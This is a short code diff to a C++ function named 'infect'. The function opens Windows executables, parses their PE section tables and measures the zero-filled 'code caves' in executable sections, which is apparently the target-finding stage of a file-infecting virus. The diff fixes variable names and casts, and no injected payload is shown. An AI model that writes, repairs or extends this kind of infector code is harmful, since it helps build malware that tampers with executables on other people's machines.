@@ -263,7 +263,7 @@ int infect(void)
 
       if (exe_handle == INVALID_HANDLE_VALUE)
       {
-         std::wcout << "\tFailed to open " << found_executable << std::endl;
+         std::wcout << "\tFailed to open " << executable << std::endl;
          goto end_exe_loop;
       }
 
@@ -271,7 +271,7 @@ int infect(void)
 
       if (file_size == INVALID_FILE_SIZE)
       {
-         std::wcout << "\t" << found_executable << " is larger than 4gb" << std::endl;
+         std::wcout << "\t" << executable << " is larger than 4gb" << std::endl;
          goto close_file;
       }
 
@@ -295,7 +295,7 @@ int infect(void)
       {
          IMAGE_SECTION_HEADER *section = &section_table[i];
 
-         if ((section->characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE)
+         if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE)
             continue;
 
          std::uint8_t *section_end = exe_buffer+section->PointerToRawData+section->SizeOfRawData;
@@ -304,7 +304,7 @@ int infect(void)
          while (*cave_begin == 0)
             --cave_begin;
          
-         std::wcout << "\t\tFound code section " << section->Name << " with cave size " << reinterpret_cast<std::uintptr_t>(section_end - cave_begin) << std::endl;
+         std::wcout << "\t\tFound code section " << section->Name << " with cave size " << static_cast<std::uintptr_t>(section_end - cave_begin) << std::endl;
       }
       
       /*
